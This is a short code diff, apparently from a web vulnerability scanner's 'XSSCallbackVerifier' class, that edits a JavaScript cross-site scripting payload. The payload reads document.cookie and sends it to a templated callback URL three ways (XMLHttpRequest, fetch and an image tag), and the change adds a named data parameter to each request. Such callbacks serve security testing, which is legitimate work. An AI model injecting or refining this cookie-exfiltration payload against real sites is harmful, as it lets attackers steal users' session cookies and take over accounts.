@@ -228,17 +228,17 @@ class XSSCallbackVerifier:
     try{{
         // Method 1: XMLHttpRequest
         var x=new XMLHttpRequest();
-        x.open('GET','{callback_url}?method=xhr'+encodeURIComponent(document.cookie){data_js},true);
+        x.open('GET','{callback_url}?method=xhr&data='+encodeURIComponent(document.cookie){data_js},true);
         x.send();
     }}catch(e){{}}
     try{{
         // Method 2: Fetch API
-        fetch('{callback_url}?method=fetch'+encodeURIComponent(document.cookie){data_js});
+        fetch('{callback_url}?method=fetch&data='+encodeURIComponent(document.cookie){data_js});
     }}catch(e){{}}
     try{{
         // Method 3: Image tag
         var i=new Image();
-        i.src='{callback_url}?method=img'+encodeURIComponent(document.cookie);
+        i.src='{callback_url}?method=img&data='+encodeURIComponent(document.cookie);
     }}catch(e){{}}
 }})();
 """.strip().replace('\n', '')
